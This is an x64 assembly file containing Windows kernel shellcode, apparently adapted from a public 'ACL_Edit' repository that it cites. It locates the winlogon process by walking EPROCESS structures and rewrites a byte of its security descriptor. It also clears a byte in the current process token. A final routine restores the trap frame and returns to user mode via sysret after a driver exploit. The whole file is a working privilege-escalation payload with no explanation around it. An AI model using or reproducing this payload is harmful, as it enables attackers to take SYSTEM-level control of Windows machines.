; https://github.com/MortenSchenk/ACL_Edit/blob/master/AclEdit.asm
[BITS 64]
  mov rax, gs:[188h]          ; KPROCESS
  mov rax, [rax+220h]         ; offset eprocess from kthread
  mov rcx, rax
  mov rax, [rax+448h]         ; offset to linked list ptr

  procloop:
  lea rbx, [rax-448h]         ; offset to linked list ptr (back to eprocess)
  mov rax, [rax]
  add rbx, 5a8h               ; offset to ImageFileName
  cmp dword [rbx], 6c6e6977h
  jne procloop

  sub rbx, 5b0h               ; offset of EPROCESS of winlogon (back from ImageFileName)
  mov rax, [rbx]
  and rax, 0FFFFFFFFFFFFFFF0h ; zero out last nibble
  add rax, 48h                
  mov byte [rax], 0fh         ; change to 0b/0f 
  add rcx, 4b8h               ; offset to Token from EPROCESS
  mov rax, [rcx]
  and rax, 0FFFFFFFFFFFFFFF0h
  add rax, 0d4h
  mov byte [rax], 0
  ; ret

  bail:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]       ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]      ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]      ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]      ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]      ; ETHREAD.TrapFrame.Rbp
  xor eax, eax          ; return STATUS_SUCCESS to NtDeviceIoControlFile 
  swapgs
  o64 sysret
